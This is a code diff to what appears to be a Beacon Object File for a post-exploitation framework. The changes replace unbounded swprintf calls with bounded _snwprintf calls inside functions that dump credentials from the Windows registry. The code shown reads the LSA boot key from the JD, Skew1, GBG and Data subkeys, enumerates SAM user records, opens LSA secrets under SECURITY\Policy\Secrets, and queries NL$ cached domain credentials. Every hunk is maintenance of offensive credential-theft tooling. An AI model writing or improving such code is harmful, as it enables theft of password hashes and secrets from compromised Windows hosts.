@@ -70,7 +70,7 @@ DECLSPEC_IMPORT void*  WINAPI MSVCRT$memset(void*, int, size_t);
 DECLSPEC_IMPORT int    WINAPI MSVCRT$memcmp(const void*, const void*, size_t);
 DECLSPEC_IMPORT size_t WINAPI MSVCRT$wcslen(const wchar_t*);
 DECLSPEC_IMPORT int    WINAPI MSVCRT$_snprintf(char*, size_t, const char*, ...);
-DECLSPEC_IMPORT int    WINAPI MSVCRT$swprintf(wchar_t*, const wchar_t*, ...);
+DECLSPEC_IMPORT int    WINAPI MSVCRT$_snwprintf(wchar_t*, size_t, const wchar_t*, ...);
 DECLSPEC_IMPORT long   WINAPI MSVCRT$wcstol(const wchar_t*, wchar_t**, int);
 
 /* ═══════════════════════════════════════════════════════════════════
@@ -392,7 +392,7 @@ static BOOL _get_boot_key(unsigned char *bootKey) {
     if (current == 0) current = 1;
 
     wchar_t lsaPath[128];
-    MSVCRT$swprintf(lsaPath, L"SYSTEM\\ControlSet%03d\\Control\\Lsa", current);
+    MSVCRT$_snwprintf(lsaPath, 128, L"SYSTEM\\ControlSet%03d\\Control\\Lsa", current);
 
     /* Read class names from JD, Skew1, GBG, Data subkeys */
     const wchar_t *subkeys[] = { L"JD", L"Skew1", L"GBG", L"Data" };
@@ -401,7 +401,7 @@ static BOOL _get_boot_key(unsigned char *bootKey) {
 
     for (int i = 0; i < 4; i++) {
         wchar_t fullPath[256];
-        MSVCRT$swprintf(fullPath, L"%s\\%s", lsaPath, subkeys[i]);
+        MSVCRT$_snwprintf(fullPath, 256, L"%s\\%s", lsaPath, subkeys[i]);
 
         HKEY hKey = NULL;
         if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, fullPath, 0, KEY_READ, &hKey) != 0) {
@@ -635,7 +635,7 @@ static void _dump_sam(const unsigned char *bootKey) {
         /* Open user subkey and read V value */
         HKEY hUser = NULL;
         wchar_t userPath[128];
-        MSVCRT$swprintf(userPath, L"SAM\\SAM\\Domains\\Account\\Users\\%s", subKeyName);
+        MSVCRT$_snwprintf(userPath, 128, L"SAM\\SAM\\Domains\\Account\\Users\\%s", subKeyName);
         if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, userPath, 0, KEY_READ, &hUser) != 0)
             continue;
 
@@ -877,7 +877,7 @@ static void _dump_lsa_secrets(const unsigned char *bootKey) {
 
         /* Open SecretName\CurrVal */
         wchar_t currValPath[512];
-        MSVCRT$swprintf(currValPath, L"SECURITY\\Policy\\Secrets\\%s\\CurrVal", secretName);
+        MSVCRT$_snwprintf(currValPath, 512, L"SECURITY\\Policy\\Secrets\\%s\\CurrVal", secretName);
 
         HKEY hCurrVal = NULL;
         if (ADVAPI32$RegOpenKeyExW(HKEY_LOCAL_MACHINE, currValPath,
@@ -1049,7 +1049,7 @@ static void _dump_cached_creds(const unsigned char *bootKey) {
 
     /* Cached entries are named NL$1, NL$2, ... NL$N */
     for (int i = 1; i <= 64; i++) {
-        MSVCRT$swprintf(valueName, L"NL$%d", i);
+        MSVCRT$_snwprintf(valueName, 64, L"NL$%d", i);
 
         DWORD dataLen = 0;
         if (ADVAPI32$RegQueryValueExW(hCache, valueName, NULL, NULL, NULL, &dataLen) != 0)
